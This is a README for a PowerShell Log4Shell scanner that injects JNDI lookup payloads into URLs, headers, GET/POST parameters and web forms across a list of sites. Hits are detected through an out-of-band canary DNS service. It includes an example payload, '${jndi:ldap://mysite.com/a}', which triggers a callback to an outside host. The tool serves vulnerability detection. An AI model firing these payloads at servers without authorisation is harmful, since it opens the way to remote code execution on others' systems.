# Invoke-Log4ShellScanner
Powershell module for Log4Shell

### Usage:

>_PS>. .Invoke-Log4ShellScanner.ps1_  
>_PS>Invoke-Log4ShellScanner -Uri [sites file] -CanaryTokenDNS [canary token/ custom IP/DNS] -Headers [headers file] -Forms -Quick_  
>_PS>Invoke-Log4ShellFastScan -Uri [sites_file] -CanaryTokenDNS [canary token/ custom IP/DNS]_  
>_PS>Invoke-Log4ShellCheckForms -Uri [url_address] -Payload_  

> * _-Uri_ - file that contains URLs to scan (https://example.com example in example-sites.txt)
> * _-CanaryTokenDNS_ - IP address or domain name of OOB service which provide us the logs
> * _-Headers_ - file that contains headers to test (all-headers.txt)
> * _-Forms_ - switch to enable forms checking [OPTIONAL]
> * _-Quick_ - switch to provide fast scan (only 2 payloads are being tested) [OPTIONAL]  
> * _-Payload_ - payload parameter (eg ${jndi:ldap://mysite.com/a})  

### Description  
The Invoke-Log4ShellScanner is a powershell script that provides 3 functions:  
1) _Invoke-Log4ShellScanner_  
The most advanced scan can test provided site pool for obfuscated payloads by sending GET,POST and optionally forms. The payload is placed inside the URI, choosen Headers and arguments of POST method and GET URI.  
2) _Invoke-Log4ShellFastScan_  
The simplest scan that uses basic payload and one obfuscated. Payload is placed inside the URI, parameter for GET method and "User-Agent" header.  
4) _Invoke-Log4ShellCheckForms_  
The function which perform checking the site (one URL) for forms and then placing the payload into the forms and send POST.  

The example files: _all-headers.txt, example-sites.txt_

# TODOS:  
[ ] The scanner cant crawl or spidering the site  
[ ] There are issues with some forms  
[ ] Port Scannner and possibilities to scan FTP/SQL and other potential services will be good.  
